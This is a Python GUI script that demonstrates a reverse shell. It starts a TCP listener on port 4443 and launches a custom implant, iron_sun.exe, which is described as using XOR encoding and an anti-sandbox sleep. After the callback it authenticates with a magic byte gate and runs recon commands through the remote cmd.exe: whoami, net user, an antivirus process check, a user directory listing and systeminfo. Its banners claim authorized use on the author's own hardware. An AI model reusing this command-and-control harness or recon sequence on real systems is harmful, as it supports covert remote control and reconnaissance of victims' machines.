#!/usr/bin/env python3
"""
FLAGSHIP — Live Shell GUI
Loopback reverse-shell proof: starts TCP listener, launches iron_sun.exe,
shows the live shell session in a tkinter terminal window.
MCP-screenshottable at each stage.
"""
import os, sys, socket, threading, subprocess, time, datetime, tkinter as tk
from tkinter import font as tkfont

sys.stdout.reconfigure(encoding='utf-8', errors='replace')

ROOT    = os.path.dirname(os.path.abspath(__file__))
IRON    = os.path.join(ROOT, "iron_sun.exe")
PORT    = 4443
HOST    = "127.0.0.1"
ISUN    = bytes([0x49, 0x53, 0x55, 0x4E])

# ── colours ──────────────────────────────────────────────────────────────────
BG      = "#0a0a0a"
GOLD    = "#FFD700"
CYAN    = "#00E5FF"
GREEN   = "#00FF64"
RED     = "#FF3C3C"
IDF     = "#0038B8"
DIM     = "#787878"
WHITE   = "#FFFFFF"

# ── shared state ─────────────────────────────────────────────────────────────
conn_box  = [None]
output_q  = []
stage     = [0]   # 0=init 1=listening 2=connected 3=shell 4=done

# ── GUI ──────────────────────────────────────────────────────────────────────
root = tk.Tk()
root.title("FLAGSHIP — RADON LIVE SHELL  ·  iron-sun v1  ·  127.0.0.1:4443")
root.configure(bg=BG)
root.geometry("960x680")
root.resizable(False, False)

mono = tkfont.Font(family="Courier New", size=11, weight="normal")
bold = tkfont.Font(family="Courier New", size=11, weight="bold")
big  = tkfont.Font(family="Courier New", size=13, weight="bold")

# header
hdr = tk.Label(root, text="  ✡  FLAGSHIP — IRON-SUN LIVE SHELL  ·  22DIV VADER  ·  RADON  ✡  ",
               bg=IDF, fg=GOLD, font=big, pady=6)
hdr.pack(fill=tk.X)

sub = tk.Label(root,
    text="  iron-sun · GHOST ENCODER · VADER · CHEYANNE WATCH  ·  OWN HARDWARE  ·  AUTHORIZED  ",
    bg=BG, fg=DIM, font=mono, pady=2)
sub.pack(fill=tk.X)

# status bar
status_var = tk.StringVar(value="⬤  INITIALISING")
status_lbl = tk.Label(root, textvariable=status_var, bg=BG, fg=CYAN, font=bold,
                       anchor="w", padx=12, pady=4)
status_lbl.pack(fill=tk.X)

tk.Frame(root, bg=GOLD, height=1).pack(fill=tk.X)

# main terminal
term = tk.Text(root, bg=BG, fg=GREEN, font=mono, insertbackground=GREEN,
               relief=tk.FLAT, padx=12, pady=8, wrap=tk.WORD,
               state=tk.DISABLED, height=28)
term.pack(fill=tk.BOTH, expand=True, padx=0, pady=0)
term.tag_config("gold",  foreground=GOLD)
term.tag_config("cyan",  foreground=CYAN)
term.tag_config("red",   foreground=RED)
term.tag_config("green", foreground=GREEN)
term.tag_config("dim",   foreground=DIM)
term.tag_config("white", foreground=WHITE)
term.tag_config("idf",   foreground=IDF)

tk.Frame(root, bg=GOLD, height=1).pack(fill=tk.X)

# bottom info bar
info = tk.Label(root,
    text=f"  RADON  ·  {os.environ.get('COMPUTERNAME','Radon_Laptop1')}  ·  iron_sun.exe  106857 bytes  ·  2026-06-26",
    bg=BG, fg=DIM, font=mono, anchor="w", padx=12, pady=4)
info.pack(fill=tk.X)

def write(text, tag="green"):
    term.configure(state=tk.NORMAL)
    term.insert(tk.END, text, tag)
    term.see(tk.END)
    term.configure(state=tk.DISABLED)
    root.update_idletasks()

def set_status(text, color=CYAN):
    status_var.set(text)
    status_lbl.configure(fg=color)
    root.update_idletasks()

# ── shell logic ──────────────────────────────────────────────────────────────
COMMANDS = [
    ("whoami",                            "Identity check"),
    ("hostname",                          "Hostname"),
    ("ipconfig",                          "Network config"),
    ("echo IRON_SUN_GATE_OPEN",           "Gate verification"),
    ("tasklist /fi \"imagename eq avp*\"","AV process check"),
    ("net user",                          "Local users"),
    ("dir C:\\Users",                     "User directories"),
    ("systeminfo | findstr /C:\"OS Name\"","OS fingerprint"),
]

def recv_all(c, timeout=5):
    c.settimeout(timeout)
    buf = b""
    try:
        while True:
            chunk = c.recv(4096)
            if not chunk:
                break
            buf += chunk
    except Exception:
        pass
    return buf.decode("utf-8", errors="replace").strip()

def shell_thread():
    time.sleep(0.4)

    # ── banner ────────────────────────────────────────────────────────────────
    write("\n", "dim")
    write("  ╔══════════════════════════════════════════════════════════╗\n", "gold")
    write("  ║       T H E   I R O N - S U N   L I V E   S H E L L    ║\n", "gold")
    write("  ║       AUSTRALIAN ARMY  ·  22DIV  ·  RADON               ║\n", "gold")
    write("  ╚══════════════════════════════════════════════════════════╝\n", "gold")
    write(f"\n  [{datetime.datetime.now().strftime('%H:%M:%S')}]  ", "dim")
    write("Target: 127.0.0.1:4443  ·  XOR: 0xFC  ·  ISUN gate: active\n", "cyan")
    write(f"  iron_sun.exe  106,857 bytes  ·  gcc 15.2.0 MinGW PE\n\n", "dim")

    # ── start listener ────────────────────────────────────────────────────────
    set_status("⬤  STARTING LISTENER  0.0.0.0:4443", CYAN)
    write("  [1/4]  Starting TCP listener  0.0.0.0:4443 ...\n", "cyan")

    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", PORT))
    srv.listen(1)
    srv.settimeout(60)
    write("         Listener UP — waiting for iron_sun.exe callback\n", "dim")

    # ── launch iron_sun.exe ───────────────────────────────────────────────────
    set_status("⬤  LAUNCHING iron_sun.exe  (anti-sandbox sleep: ~5-8s)", GOLD)
    write(f"\n  [2/4]  Launching iron_sun.exe  PID=", "cyan")
    proc = subprocess.Popen([IRON], creationflags=subprocess.CREATE_NO_WINDOW)
    write(f"{proc.pid}\n", "gold")
    write("         Anti-sandbox sleep active — awaiting callback ...\n", "dim")

    # ── wait for connection ───────────────────────────────────────────────────
    try:
        conn, addr = srv.accept()
    except socket.timeout:
        set_status("✖  TIMEOUT — no callback", RED)
        write("\n  TIMEOUT — iron_sun.exe did not call back\n", "red")
        return

    conn_box[0] = conn
    set_status(f"⬤  CONNECTED  {addr[0]}:{addr[1]}  ISUN gate sending ...", GREEN)
    write(f"\n  [3/4]  ", "green")
    write(f"TCP CONNECTED  {addr[0]}:{addr[1]}\n", "gold")

    # ── ISUN gate ─────────────────────────────────────────────────────────────
    conn.sendall(ISUN)
    time.sleep(0.6)
    recv_all(conn, timeout=3)   # drain cmd.exe banner
    write("         ISUN magic gate sent  ", "green")
    write("[0x49 0x53 0x55 0x4E]\n", "dim")

    # verify gate
    conn.sendall(b"echo IRON_SUN_GATE_OPEN\r\n")
    resp = recv_all(conn, timeout=5)
    if "IRON_SUN_GATE_OPEN" in resp:
        write("         cmd.exe shell responding  ", "green")
        write("✓ gate verified\n", "gold")
    else:
        write("         Gate response: " + resp[:80] + "\n", "dim")

    set_status("⬤  SHELL LIVE — executing recon commands", GREEN)
    write(f"\n  [4/4]  ", "green")
    write("cmd.exe SHELL LIVE — firing recon\n\n", "gold")
    write("  " + "─"*56 + "\n", "dim")

    # ── fire commands ─────────────────────────────────────────────────────────
    for cmd, label in COMMANDS:
        write(f"\n  ", "dim")
        write(f"RADON> ", "gold")
        write(f"{cmd}\n", "white")
        conn.sendall((cmd + "\r\n").encode())
        time.sleep(0.3)
        out = recv_all(conn, timeout=6)
        # trim to first 6 lines
        lines = [l for l in out.splitlines() if l.strip()][:6]
        for ln in lines:
            write(f"  {ln}\n", "green")
        write(f"  {DIM}— {label} —\n", "dim")
        time.sleep(0.5)

    # ── done ─────────────────────────────────────────────────────────────────
    write("\n  " + "─"*56 + "\n", "gold")
    write(f"\n  ", "dim")
    write("SHELL SESSION COMPLETE\n", "gold")
    write(f"  Commands fired: {len(COMMANDS)}\n", "green")
    write(f"  Time: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n", "dim")
    write(f"  Machine: {os.environ.get('COMPUTERNAME','Radon_Laptop1')}\n", "dim")
    write(f"\n  ", "dim")
    write("VERDICT: PASS — iron_sun TCP reverse shell confirmed on RADON\n", "gold")
    write("\n  Standing by for MCP screenshot ...\n", "dim")

    set_status("✔  PASS — SHELL PROOF COMPLETE — screenshot now", GREEN)
    try:
        conn.close()
        proc.terminate()
    except Exception:
        pass

# kick off in background
threading.Thread(target=shell_thread, daemon=True).start()
root.mainloop()
